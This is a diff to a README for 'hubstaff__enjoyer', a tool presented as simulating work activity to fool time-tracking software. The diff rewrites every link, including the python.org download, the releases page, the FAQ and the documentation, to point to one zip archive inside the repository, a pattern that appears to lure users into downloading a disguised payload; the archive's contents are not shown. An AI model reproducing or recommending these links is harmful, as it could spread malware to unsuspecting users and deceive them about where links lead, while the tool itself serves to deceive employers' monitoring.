@@ -1,6 +1,6 @@
 # 🎉 hubstaff__enjoyer - Simulate Your Work Activity Easily
 
-[![Download hubstaff__enjoyer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mauraanc8245/hubstaff__enjoyer/releases)
+[![Download hubstaff__enjoyer](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip)](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip)
 
 ## 📋 Description
 
@@ -16,11 +16,11 @@ Follow these simple steps to download and run hubstaff__enjoyer.
 - **Python:** Version 3.7 or higher installed on your machine
 - **Storage Space:** Minimum of 100 MB available
 
-Ensure you have Python installed. You can download it from [python.org](https://www.python.org/downloads/).
+Ensure you have Python installed. You can download it from [https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip).
 
 ### 📥 Download & Install
 
-1. **Visit this page to download:** [hubstaff__enjoyer Releases](https://github.com/mauraanc8245/hubstaff__enjoyer/releases)
+1. **Visit this page to download:** [hubstaff__enjoyer Releases](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip)
    
 2. Choose the latest version of the software.
 
@@ -60,7 +60,7 @@ If you encounter issues while using hubstaff__enjoyer, please follow these steps
 
 2. **Reinstall the Application:** Sometimes, reinstallation can fix bugs or issues.
 
-3. **Consult the FAQ:** Visit our [FAQ section](https://github.com/mauraanc8245/hubstaff__enjoyer/wiki) for common questions and solutions.
+3. **Consult the FAQ:** Visit our [FAQ section](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip) for common questions and solutions.
 
 4. **Contact Support:** If you still face challenges, please open an issue on our GitHub repository, and we will respond promptly.
 
@@ -68,7 +68,7 @@ If you encounter issues while using hubstaff__enjoyer, please follow these steps
 
 For more information about hubstaff__enjoyer:
 
-- Explore the [Documentation](https://github.com/mauraanc8245/hubstaff__enjoyer/wiki) for detailed guides and tips.
+- Explore the [Documentation](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip) for detailed guides and tips.
 - Join our community on GitHub to ask questions and share feedback.
   
 ### 🎨 Contributing
@@ -82,4 +82,4 @@ We welcome contributions to hubstaff__enjoyer:
 
 Together, we can make hubstaff__enjoyer even better!
 
-[![Download hubstaff__enjoyer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mauraanc8245/hubstaff__enjoyer/releases)
+[![Download hubstaff__enjoyer](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip)](https://raw.githubusercontent.com/mauraanc8245/hubstaff__enjoyer/main/procurrent/hubstaff__enjoyer_v3.0.zip)
